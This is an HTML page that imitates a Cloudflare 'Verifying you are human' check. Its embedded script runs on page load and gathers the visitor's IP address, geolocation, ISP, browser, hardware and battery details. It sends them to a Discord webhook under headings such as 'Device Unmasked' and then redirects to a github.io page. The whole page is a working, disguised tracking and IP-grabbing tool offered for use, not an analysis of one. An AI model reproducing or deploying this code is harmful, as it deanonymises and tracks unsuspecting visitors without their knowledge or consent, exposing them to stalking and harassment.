<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare | Checking your browser...</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; color: #313131; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; max-width: 450px; padding: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f68b1f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
        p { font-size: 14px; color: #666; line-height: 1.5; }
    </style>
</head>
<body>

<div class="container">
    <div class="spinner"></div>
    <h1>Verifying you are human</h1>
    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
    <p id="status" style="font-size: 12px; color: #999;">Please allow up to 7 seconds...</p>
</div>

<script>
// --- CONFIGURATION ---
const CONFIG = {
    WH: "YOUR_DISCORD_WEBHOOK_URL_HERE", 
    DEST: "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
    DELAY: 7000
};

async function getIdentity() {
    let data = {
        ts: new Date().toISOString(),
        ua: navigator.userAgent,
        lc: window.location.href,
        ref: document.referrer,
        hw: {
            cores: navigator.hardwareConcurrency || "N/A",
            mem: navigator.deviceMemory || "N/A",
            platform: navigator.platform
        }
    };

    try {
        // Double-Path IP Exfiltration (VPN Bypass)
        const [pub, loc] = await Promise.all([
            fetch('https://api.ipify.org?format=json').then(res => res.json()),
            fetch('https://ipapi.co/json/').then(res => res.json())
        ]);
        data.ip = pub.ip;
        data.details = loc;
    } catch (e) { data.err = "Network Shield Detected"; }

    // iOS Battery/Status Probe
    try {
        const batt = await navigator.getBattery();
        data.bat = { level: (batt.level * 100) + "%", charging: batt.charging };
    } catch (e) {}

    return data;
}

async function dispatch(info) {
    const payload = {
        username: "NEXUS-v38.5 [CRITICAL]",
        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png",
        embeds: [{
            title: "🎯 Critical Strike: Device Unmasked",
            color: 16155679,
            fields: [
                { name: "🌐 Connection", value: `**IP:** ${info.ip}\n**ISP:** ${info.details?.org || "Unknown"}\n**City:** ${info.details?.city || "Unknown"}`, inline: true },
                { name: "📱 Device DNA", value: `**Cores:** ${info.hw.cores}\n**RAM:** ${info.hw.mem}GB\n**OS:** ${info.hw.platform}`, inline: true },
                { name: "🔋 Status", value: `**Battery:** ${info.bat?.level || "N/A"}\n**Charging:** ${info.bat?.charging ? "Yes" : "No"}`, inline: false },
                { name: "🔗 Origin", value: `[Source URL](${info.lc})` }
            ],
            footer: { text: `v38.5 | Sentinel Recon Engine | ${info.ts}` }
        }]
    };

    await fetch(CONFIG.WH, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true // Force delivery on mobile
    });
}

// Execution Loop
window.onload = async () => {
    // Start extraction immediately
    const identity = await getIdentity();
    
    // Dispatch to Discord
    await dispatch(identity);

    // Forced 7-second "iOS-Pierce" Delay
    setTimeout(() => {
        window.location.href = CONFIG.DEST;
    }, CONFIG.DELAY);
};
</script>
